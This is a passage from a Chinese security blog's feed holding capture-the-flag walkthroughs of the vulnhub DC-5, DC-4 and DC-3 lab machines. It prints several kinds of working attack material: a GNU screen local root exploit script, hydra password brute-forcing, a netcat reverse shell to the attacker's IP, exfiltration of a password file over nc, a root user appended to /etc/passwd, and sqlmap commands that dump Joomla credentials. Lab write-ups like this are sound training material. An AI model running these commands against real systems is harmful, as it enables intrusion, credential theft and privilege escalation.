&quot;\x0a/tmp/libhax.so&quot; # newline neededecho &quot;[+] Triggering...&quot;screen -ls # screen itself is setuid, so.../tmp/rootshell</code></pre><h5 id="4-编译libhax-c文件"><a href="#4-编译libhax-c文件" class="headerlink" title="4.编译libhax.c文件"></a>4.编译libhax.c文件</h5><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312131546987.png" alt="image-20231213154607953"></p><pre><code>gcc -fPIC -shared -ldl -o libhax.so libhax.c</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312131547678.png" alt="image-20231213154753646"></p><h5 id="5-编译rootshell-c文件并删除"><a href="#5-编译rootshell-c文件并删除" class="headerlink" title="5.编译rootshell.c文件并删除"></a>5.编译rootshell.c文件并删除</h5><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312131548171.png" alt="image-20231213154859138"></p><pre><code>gcc -o rootshell rootshell.c rm -f rootshell.c</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312131550059.png" alt="image-20231213155059019"></p><h5 id="6-另存为新的dc5-sh文件"><a href="#6-另存为新的dc5-sh文件" class="headerlink" title="6.另存为新的dc5.sh文件"></a>6.另存为新的dc5.sh文件</h5><p>将刚才利用到的脚本和命令删除 另存为新的<code>dc5.sh</code>文件</p><pre><code class="sh">#!/bin/bash# screenroot.sh# setuid screen v4.5.0 local root exploit# abuses ld.so.preload overwriting to get root.# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html# HACK THE PLANET# ~ infodox (25/1/2017)echo &quot;~ gnu/screenroot ~&quot;echo &quot;[+] First, we create our shell and library...&quot;echo &quot;[+] Now we create our /etc/ld.so.preload file...&quot;cd /etcumask 000 # becausescreen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot; # newline neededecho &quot;[+] Triggering...&quot;screen -ls # screen itself is setuid, so.../tmp/rootshell</code></pre><p>保存的时候 在最后面加上 :set ff&#x3D;unix 防止脚本格式错误</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312131608434.png" alt="image-20231213160812384"></p><h5 id="6-下载漏洞脚本到靶机"><a href="#6-下载漏洞脚本到靶机" class="headerlink" title="6.下载漏洞脚本到靶机"></a>6.下载漏洞脚本到靶机</h5><pre><code>wget http://192.168.160.150/rootshellwget http://192.168.160.150/libhax.sowget http://192.168.160.150/dc5.sh</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312131558256.png" alt="image-20231213155855211"></p><h5 id="7-提权"><a href="#7-提权" class="headerlink" title="7.提权"></a>7.提权</h5><p>将这三个文件传给靶机之后 赋予<code>dc5.sh</code>执行权限</p><pre><code>chmod +x dc5.shchmod 777 dc5.sh</code></pre><p>在直接执行就可以得到root权限</p><p>但是我这边会报错 在执行<code>rootshell</code>文件时显示glibc环境不对 可能是编译<code>rootshell</code>文件时的环境版本太高了 但前面的操作步骤是没问题的 解决的话 只能是换一个低版本的环境去编译<code>rootshell</code> </p><p>正常情况下就是可以直接得到root权限 进入root文件夹 看到flag文件了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312142130449.png" alt="image-20231214213017381"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>至此 DC-5靶场通关</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;vulnhub靶场DC-5通关记录&quot;&gt;&lt;a href=&quot;#vulnhub靶场DC-5通关记录&quot; class=&quot;headerlink&quot; title=&quot;vulnhub靶场DC-5通关记录&quot;&gt;&lt;/a&gt;vulnhub靶场DC-5通关记录&lt;/h1&gt;&lt;h2 id=&quot;靶场描述&quot;</summary>
      
    
    
    
    <category term="渗透" scheme="http://w3nx1z1.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="打靶" scheme="http://w3nx1z1.github.io/tags/%E6%89%93%E9%9D%B6/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场记录DC-4</title>
    <link href="http://w3nx1z1.github.io/2023/12/04/vulnhub%E9%9D%B6%E5%9C%BADC-4%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"/>
    <id>http://w3nx1z1.github.io/2023/12/04/vulnhub%E9%9D%B6%E5%9C%BADC-4%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/</id>
    <published>2023-12-04T13:20:50.452Z</published>
    <updated>2023-12-13T05:05:38.966Z</updated>
    
    <content type="html"><![CDATA[<h1 id="vulnhub靶场DC-4通关记录"><a href="#vulnhub靶场DC-4通关记录" class="headerlink" title="vulnhub靶场DC-4通关记录"></a>vulnhub靶场DC-4通关记录</h1><h2 id="靶场描述"><a href="#靶场描述" class="headerlink" title="靶场描述"></a>靶场描述</h2><pre><code>DC-4 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.Unlike the previous DC releases, this one is designed primarily for beginners/intermediates. There is only one flag, but technically, multiple entry points and just like last time, no clues.Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won&#39;t give you the answer, instead, I&#39;ll give you an idea about how to move forward.</code></pre><h2 id="渗透靶场"><a href="#渗透靶场" class="headerlink" title="渗透靶场"></a>渗透靶场</h2><h3 id="一、信息搜集"><a href="#一、信息搜集" class="headerlink" title="一、信息搜集"></a>一、信息搜集</h3><p>首先给靶机开启NAT桥接模式  在攻击机中使用nmap扫描靶机ip</p><pre><code>nmap 192.168.160.0/24</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312041516844.png" alt="image-20231204151608787"></p><p>找打靶机ip</p><pre><code>192.168.160.155</code></pre><p>再进一步扫一下端口</p><pre><code>nmap -A -p- -v 192.168.160.155</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312041517935.png" alt="image-20231204151733892"></p><pre><code>开放了80端口 存在web服务 使用nginx中间件 版本1.15.10开放了22端口 存在ssh服务 Openss版本7.4p1</code></pre><p>在使用whatweb进行CMS识别 搜集一波信息</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312041521721.png" alt="image-20231204152115668"></p><p>在使用dirsearch扫一波目录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312041641121.png" alt="image-20231204164145053"></p><h3 id="二、访问web站点"><a href="#二、访问web站点" class="headerlink" title="二、访问web站点"></a>二、访问web站点</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312041521221.png" alt="image-20231204152149183"></p><h4 id="爆破网站登陆密码"><a href="#爆破网站登陆密码" class="headerlink" title="爆破网站登陆密码"></a>爆破网站登陆密码</h4><p>使用bp或者hydra爆破都可以</p><pre><code>hydra -l admin -P /home/kali/Desktop/brutehash/rockyou.txt 192.168.160.155 http-post-form &quot;/login.php:username=^USER^&amp;password=^PASS^:S=logout&quot; -F</code></pre><pre><code>-l 用户名-L 用户名字典-p 密码-P 密码字典http-post-form 使用http协议下的post方法进行破解&quot;/login.php:username=^USER^&amp;password=^PASS^:S=logout&quot;：1.&quot;/&quot;指登陆页面所在目录 该网站的登陆目录在index.php 2.POST提交的内容只是把用户名和密码部分换成了^USER^和^PASS^。USER对应前面的-l 后跟的用户名root，PASS会被字典中的密码逐个替换</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312041711268.png" alt="image-20231204171144220"></p><p>密码是happy</p><p>bp爆破就用本机访问一下 抓个包 找几个字典 一秒爆出来了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312041712487.png" alt="image-20231204171250442"></p><p>使用<code>username:admin/password:happy</code>登陆</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312041719106.png" alt="image-20231204171902074"></p><p>看起来有一个任意命令执行</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312041736027.png" alt="image-20231204173657999"></p><p>执行了<code>ls -l</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312041738462.png" alt="image-20231204173842427"></p><p>执行了<code>du -h</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312041738659.png" alt="image-20231204173857621"></p><p>执行了<code>df -h</code></p><p>抓个包看看</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312041739572.png" alt="image-20231204173927523"></p><p>真是执行了<code>ls -l</code> 同时也看到这里空格是使用<code>+</code>表示的 那我们可以利用这一点反弹shell了</p><h3 id="三、反弹shell"><a href="#三、反弹shell" class="headerlink" title="三、反弹shell"></a>三、反弹shell</h3><p>先开一个终端 监听一下端口</p><pre><code>nc -lvvp 1145</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312042027819.png" alt="image-20231204202758687"></p><p>再在bp上写入反弹shell的命令 </p><pre><code>nc 192.168.160.131 4444 -e /bin/bash在这个环境中 空格要使用+代替nc+192.168.160.131+4444+-e+/bin/bash</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312042055519.png" alt="image-20231204205554477"></p><p>这边这个ip一定要写攻击机的</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312042056474.png" alt="image-20231204205638442"></p><p>反弹成功</p><p>在用python创造一个交互式的shell</p><pre><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312042059878.png" alt="image-20231204205905844"></p><h4 id="找到并提取密码文件"><a href="#找到并提取密码文件" class="headerlink" title="找到并提取密码文件"></a>找到并提取密码文件</h4><p>在home文件夹下查看用户 找到三个用户</p><pre><code>charles jim sam</code></pre><p>在<code>/home/jim/backups</code>下找到一个<code>old-passwords.bak</code> 查看内容 看起来很像字典 使用nc将这个文件保存到本机</p><p>现在攻击机下监听一个端口 指定接受一个文件</p><pre><code>nc -lvvp 5555 &gt; old-passwords.bak</code></pre><p>再在shell里面监听相同的端口 指定发送上面的密码文件</p><pre><code>nc 192.168.160.131 5555 &lt; old-passwords.bak</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312042114958.png" alt="image-20231204211415921"></p><p>接收到了</p><h3 id="四、登陆用户"><a href="#四、登陆用户" class="headerlink" title="四、登陆用户"></a>四、登陆用户</h3><h4 id="使用hydra爆破jim用户密码"><a href="#使用hydra爆破jim用户密码" class="headerlink" title="使用hydra爆破jim用户密码"></a>使用hydra爆破jim用户密码</h4><p>可以使用这个字典文件爆破jim用户的密码 还是使用hydra</p><pre><code>hydra -l jim -P old-passwords.bak ssh://192.168.160.155</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312042118415.png" alt="image-20231204211835368"></p><p>爆破出密码为&#96;&#96;</p><h4 id="登陆jim用户-发现charles用户密码"><a href="#登陆jim用户-发现charles用户密码" class="headerlink" title="登陆jim用户 发现charles用户密码"></a>登陆jim用户 发现charles用户密码</h4><p>使用刚才爆出来的jim用户密码进行登陆</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051105493.png" alt="image-20231205110555449"></p><p>使用ssh也可以进行连接</p><pre><code>ssh jim@192.168.160.155</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051125436.png" alt="image-20231205112534390"></p><p>提示有一封邮件 </p><p>在<code>/var/mail</code>文件夹下找到邮件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051141626.png" alt="image-20231205114140559"></p><p>这是一封charles发给jim的邮件 从中可以得到charles的登录密码为<code>^xHhA&amp;hvim0y</code></p><h3 id="五、提权"><a href="#五、提权" class="headerlink" title="五、提权"></a>五、提权</h3><h4 id="使用teehee进行提权"><a href="#使用teehee进行提权" class="headerlink" title="使用teehee进行提权"></a>使用teehee进行提权</h4><p>使用上面得到的密码 切换到charles用户后 查看这个用户有什么可以使用的root命令</p><pre><code>sudo -l</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051153811.png" alt="image-20231205115337768"></p><p>发现可以无密码使用teehee</p><p>先看一下用法</p><pre><code>teehee -h</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051415590.png" alt="image-20231205141537541"></p><p><code>-a</code>参数允许往一个文件中追加内容 </p><h5 id="1-x2F-etc-x2F-passwd"><a href="#1-x2F-etc-x2F-passwd" class="headerlink" title="1.&#x2F;etc&#x2F;passwd"></a>1.&#x2F;etc&#x2F;passwd</h5><p>我们可以利用这一点 向<code>/etc/passwd</code>文件中追加一个新的超级用户</p><p>先用openssl生成一个加盐的密码</p><pre><code>openssl passwd -1 -salt 1*2*3 abcd# $1$1*2*3$GDXeco9uaGB.Q0i0wsFCA1</code></pre><p>使用teehee创建超级用户</p><pre><code>echo &#39;abc:$1$1*2*3$GDXeco9uaGB.Q0i0wsFCA1:0:0:root:/bin/bash&#39; |sudo teehee -a /etc/passwd</code></pre><p>登录abc用户 输入密码<code>abcd</code> 成功登录 是root权限</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051426768.png" alt="image-20231205142608726"></p><h5 id="2-x2F-etc-x2F-sudoers"><a href="#2-x2F-etc-x2F-sudoers" class="headerlink" title="2.&#x2F;etc&#x2F;sudoers"></a>2.&#x2F;etc&#x2F;sudoers</h5><p>相同的 我们也可以添加一个超级用户到<code>/etc/sudoers</code>中  </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051526756.png" alt="image-20231205152634690"></p><p>我们可以使用teehee在&#x2F;etc&#x2F;sudoers文件后追加</p><pre><code>charles    ALL=(root) ALL</code></pre><p>输入</p><pre><code>echo &#39;charles    ALL=(root) ALL&#39; |sudo teehee -a /etc/sudoers</code></pre><p>在使用vi提权</p><pre><code>vi privilege.txt输入charles用户密码:!/bin/bash</code></pre><p>在输入</p><pre><code>sudo -l</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051538862.png" alt="image-20231205153826818"></p><h4 id="exim4-suid-提权"><a href="#exim4-suid-提权" class="headerlink" title="exim4(suid)提权"></a>exim4(suid)提权</h4><p>首先查看charles用户可以使用suid提权的命令</p><pre><code>find / -type f -perm -u=s 2&gt;dev/null</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051558395.png" alt="image-20231205155804351"></p><p>其中<code>exim4</code>是可以进行提权的</p><p>但是不知道为啥charles用户用不了这个命令 那我们还回到最初的www-data用户</p><pre><code>exim4 --version</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051606235.png" alt="image-20231205160605193"></p><h5 id="1-查找漏洞利用脚本"><a href="#1-查找漏洞利用脚本" class="headerlink" title="1.查找漏洞利用脚本"></a>1.查找漏洞利用脚本</h5><pre><code>searchsploit exim 4</code></pre><p>找到好几个都可以使用的提权脚本</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051618214.png" alt="image-20231205161805143"></p><p>选择第一个<code>46996.sh</code></p><h5 id="2-利用脚本"><a href="#2-利用脚本" class="headerlink" title="2.利用脚本"></a>2.利用脚本</h5><p>找到脚本的路径</p><pre><code>searchsploit -p 46996.sh</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051619549.png" alt="image-20231205161924515"></p><p>将脚本复制到桌面</p><pre><code>cp /usr/share/exploitdb/exploits/linux/local/46996.sh 46996.sh </code></pre><p>开启apache服务</p><pre><code>systemctl start apache2.service</code></pre><p>将这个漏洞攻击文件转移到<code>/var/html/www</code>文件夹下</p><pre><code>mv 46996.sh /var/www/html </code></pre><p>将文件下载到靶机<code>/tmp</code>中</p><pre><code>wget http://192.168.160.150/46996.sh</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051630282.png" alt="image-20231205163009242"></p><p>看到此时用户对<code>46996.sh</code>并没有执行权限</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051631698.png" alt="image-20231205163148657"></p><p>赋予执行权限</p><pre><code>chmod +x 46996.sh</code></pre><p>执行脚本 发现得到root权限</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051633173.png" alt="image-20231205163319129"></p><p>进入到root文件夹下 得到flag</p><pre><code>888       888          888 888      8888888b.                             888 888 888 888 888   o   888          888 888      888  &quot;Y88b                            888 888 888 888 888  d8b  888          888 888      888    888                            888 888 888 888 888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 888d88888b888 d8P  Y8b 888 888      888    888 d88&quot;&quot;88b 888 &quot;88b d8P  Y8b 888 888 888 888 88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P 8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      &quot;   &quot;   &quot;   &quot;  888P     Y888  &quot;Y8888  888 888      8888888P&quot;   &quot;Y88P&quot;  888  888  &quot;Y8888  888 888 888 888 Congratulations!!!Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all thosewho have provided feedback, and who have taken time to complete these littlechallenges.If you enjoyed this CTF, send me a tweet via @DCAU7.</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051427051.png" alt="image-20231205142713009"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>至此，DC-4靶机打完</p><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p><a href="https://blog.csdn.net/Deeeelete/article/details/106883762?ops_request_misc=&request_id=&biz_id=102&utm_term=kali%E4%B8%8A%E5%AE%89%E8%A3%85nc&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-106883762.142%5Ev96%5Epc_search_result_base9&spm=1018.2226.3001.4187">kali中nc实现通信、传输文件、反弹shell、python等脚本反弹shell</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;vulnhub靶场DC-4通关记录&quot;&gt;&lt;a href=&quot;#vulnhub靶场DC-4通关记录&quot; class=&quot;headerlink&quot; title=&quot;vulnhub靶场DC-4通关记录&quot;&gt;&lt;/a&gt;vulnhub靶场DC-4通关记录&lt;/h1&gt;&lt;h2 id=&quot;靶场描述&quot;</summary>
      
    
    
    
    <category term="渗透" scheme="http://w3nx1z1.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="打靶" scheme="http://w3nx1z1.github.io/tags/%E6%89%93%E9%9D%B6/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场记录DC-3</title>
    <link href="http://w3nx1z1.github.io/2023/11/30/vulnhub%E9%9D%B6%E5%9C%BADC-3%E9%80%9A%E5%85%B3wp/"/>
    <id>http://w3nx1z1.github.io/2023/11/30/vulnhub%E9%9D%B6%E5%9C%BADC-3%E9%80%9A%E5%85%B3wp/</id>
    <published>2023-11-30T01:27:54.762Z</published>
    <updated>2023-11-30T01:28:28.907Z</updated>
    
    <content type="html"><![CDATA[<h1 id="vulnhub靶场DC-3通关wp"><a href="#vulnhub靶场DC-3通关wp" class="headerlink" title="vulnhub靶场DC-3通关wp"></a>vulnhub靶场DC-3通关wp</h1><h2 id="靶场描述"><a href="#靶场描述" class="headerlink" title="靶场描述"></a>靶场描述</h2><pre><code>DC-3 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.As with the previous DC releases, this one is designed with beginners in mind, although this time around, there is only one flag, one entry point and no clues at all.Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won&#39;t give you the answer, instead, I&#39;ll give you an idea about how to move forward.For those with experience doing CTF and Boot2Root challenges, this probably won&#39;t take you long at all (in fact, it could take you less than 20 minutes easily).If that&#39;s the case, and if you want it to be a bit more of a challenge, you can always redo the challenge and explore other ways of gaining root and obtaining the flag.</code></pre><p>这次的靶场描述是有一个flag和一个入口 同时也需要我们获取root权限</p><h2 id="渗透靶场"><a href="#渗透靶场" class="headerlink" title="渗透靶场"></a>渗透靶场</h2><h3 id="一、信息搜集"><a href="#一、信息搜集" class="headerlink" title="一、信息搜集"></a>一、信息搜集</h3><p>和之前一样 设置的是NAT桥接模式  和渗透机共享ip  直接nmap扫描存活的主机</p><pre><code>nmap 192.168.160.0/24</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311300852153.png" alt="image-20231127223920923"></p><p>发现80端口 找到靶机的ip地址</p><pre><code>192.168.160.153</code></pre><p>进一步扫一下端口信息</p><pre><code>nmap -A -p- -v 192.168.160.153</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311300852750.png" alt="image-20231127224442087"></p><p>发现开放的端口很少 只有一个80端口 开放了web服务 使用Apache中间件 版本2.4.18</p><p>在使用whatweb进行CMS识别 在搜集一波信息</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311300853935.png" alt="image-20231127225737501"></p><p>发现应该是使用Joomla框架搭建的网站</p><h3 id="二、访问web站点"><a href="#二、访问web站点" class="headerlink" title="二、访问web站点"></a>二、访问web站点</h3><p>直接访问<code>192.168.160.153</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311300853070.png" alt="image-20231127225320441"></p><pre><code>This time, there is only one flag, one entry point and no clues.To get the flag, you&#39;ll obviously have to gain root privileges.How you get to be root is up to you - and, obviously, the system.Good luck - and I hope you enjoy this little challenge.  :-)</code></pre><p>发现页面有登陆入口 也许是一个突破点 </p><h4 id="dirb扫目录"><a href="#dirb扫目录" class="headerlink" title="dirb扫目录"></a>dirb扫目录</h4><p>这里可以使用<strong>dirb</strong>扫一下目录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311300853153.png" alt="image-20231127231227172"></p><p>扫到了一个登陆页面 访问一下</p><pre><code>http://192.168.160.153/administrator/   </code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311300853411.png" alt="image-20231127231309195"></p><p>是joomal框架后台登陆页面 </p><h3 id="三、joomla框架sql注入漏洞"><a href="#三、joomla框架sql注入漏洞" class="headerlink" title="三、joomla框架sql注入漏洞"></a>三、joomla框架sql注入漏洞</h3><h4 id="1、msf扫漏洞"><a href="#1、msf扫漏洞" class="headerlink" title="1、msf扫漏洞"></a>1、msf扫漏洞</h4><p>还是和之前一样 使用msf扫一下漏洞</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311300853231.png" alt="image-20231127230604957"></p><p>有很多rce的漏洞 包括反序列化 文件上传 sql注入 </p><p>我们这里先用模块14扫一下joomla框架版本</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311300853808.png" alt="image-20231127230732196"></p><p>成功扫到框架版本是3.7.0</p><p>既然已经得到了框架版本 那就来看一下这个版本下的框架有什么东西</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311300853029.png" alt="image-20231127231618785"></p><p>看来是有sql注入的漏洞</p><h4 id="2、使用joomlascan"><a href="#2、使用joomlascan" class="headerlink" title="2、使用joomlascan"></a>2、使用joomlascan</h4><pre><code>（JoomScan）：是一个开源项目，旨在自动执行Joomla CMS部署中的漏洞检测和可靠性保证任务。该工具在Perl中实现，可以无缝轻松地扫描Joomla安装，同时通过其轻量级和模块化架构留下最小的占地面积。它不仅可以检测已知的攻击性漏洞，还能够检测到许多错误配置和管理员级别的缺陷，这些缺陷可被攻击者利用来破坏系统。</code></pre><p>安装</p><pre><code>git clone https://github.com/rezasp/joomscan.gitcd joomscan</code></pre><p>使用</p><pre><code>perl joomla.pl --url 192.168.160.153</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311291127071.png" alt="image-20231129112703991"></p><p>其实在这个靶场中 和我们刚刚使用msf扫出来的信息差不太多 也是知道了后台登陆网址 joomla框架信息啥的</p><h4 id="3、searchsploit扫sql注入漏洞脚本"><a href="#3、searchsploit扫sql注入漏洞脚本" class="headerlink" title="3、searchsploit扫sql注入漏洞脚本"></a>3、searchsploit扫sql注入漏洞脚本</h4><p>学一下searchsploit的命令吧</p><pre><code>searchsploit joomla 3.7.0 // 基本搜索searchsploit -t joomla 3.7.0 // 标题搜索 只匹配标题 不匹配路径searchsploit -m 42033.py // 复制到文件夹searchsploit -p 42033.py // 显示了漏洞的完整路径</code></pre><p>使用searchsploit找到了这个版本的joomla框架的sql注入漏洞利用脚本</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311291137676.png" alt="image-20231129113754624"></p><p>找一下漏洞利用脚本的完整路径</p><pre><code>searchsploit -p 42033.py</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311291144738.png" alt="image-20231129114414702"></p><p>把这个文件复制到本地</p><pre><code>┌──(kali㉿kali)-[~/桌面/joomscan]└─$ cp /usr/share/exploitdb/exploits/php/webapps/42033.txt 42033.py</code></pre><p>查看一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311291146988.png" alt="image-20231129114600939"></p><p>看来是直接使用sqlmap自动工具进行攻击的 将<code>Using sqlmap</code>部分的ip改为靶机ip  进行sql注入</p><pre><code>python3 sqlmap.py -u &quot;http://192.168.160.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311291231967.png" alt="image-20231129123121878"></p><p>扫出来五个数据库</p><pre><code>available databases [5]:[*] information_schema[*] joomladb[*] mysql[*] performance_schema[*] sys</code></pre><p>joomla框架搭建的网站默认数据库是joomladb 那我们接下来开始爆表名</p><pre><code>python3 sqlmap.py -u &quot;http://192.168.160.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomladb --tables -p list[fullordering]</code></pre><p>找到76个表</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311300854266.png" alt="image-20231129163133461"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311300854658.png" alt="image-20231129163224857"></p><p>找到关键的<code>__users</code>表 看一下表中的字段</p><pre><code>python3 sqlmap.py -u &quot;http://192.168.160.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomladb -T &#39;#__users&#39; --columns -p list[fullordering]</code></pre><p>一共有6个字段</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311300854987.png" alt="image-20231129164401809"></p><p>查看一下<code>username</code> <code>password</code>d 内容</p><pre><code>python3 sqlmap.py -u &quot;http://192.168.160.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomladb -T &#39;#__users&#39; -C &quot;username,password&quot; --dump  -p list[fullordering]</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311300854691.png" alt="image-20231129164901490"></p><p>尝试爆一下密码</p><pre><code>john --wordlist=password.lst --user=name hash out.txt </code></pre><p>得到<code>snoopy</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311300854126.png" alt="image-20231129165703984"></p><h3 id="四、登陆网站后台"><a href="#四、登陆网站后台" class="headerlink" title="四、登陆网站后台"></a>四、登陆网站后台</h3><p>使用<code>admin/snoopy</code>成功登陆网站后台</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311300854248.png" alt="image-20231129170324489"></p><h3 id="五、拿到靶机shell"><a href="#五、拿到靶机shell" class="headerlink" title="五、拿到靶机shell"></a>五、拿到靶机shell</h3><p>回到刚才msf扫漏洞</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311300854591.png" alt="image-20231127231618785"></p><p>发现是一个Joomla 组件字段 SQLi 远程代码执行 就用这个漏洞拿到shell</p><pre><code>use 0set RHOST 192.168.160.153runshell</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311300854997.png" alt="image-20231129172705660"></p><p>再创建一个交互式shell</p><pre><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></pre><p>可以看到是<code>www-data</code>用户 这是一个低权限用户 想要看到root中的内容还是需要提权</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311300854345.png" alt="image-20231129172919921"></p><h3 id="六、提权"><a href="#六、提权" class="headerlink" title="六、提权"></a>六、提权</h3><p>有之前DC-1 DC-2的经验 尝试使用suid和git进行提权</p><p>首先找了拥有suid权限的命令</p><pre><code>find / -type f -perm -u=s 2&gt;dev/null</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311300854044.png" alt="image-20231129173830949"></p><p>然而之前提到的<code>find vim cp</code>的提权命令都没有 再看看能不能git提权</p><p>使用<code>sudo -l</code>看看具有root权限的命令有哪些</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311300854082.png" alt="image-20231129174006935"></p><p>但是在这个靶场中 我们找不到用户<code>www-data</code>的登陆密码 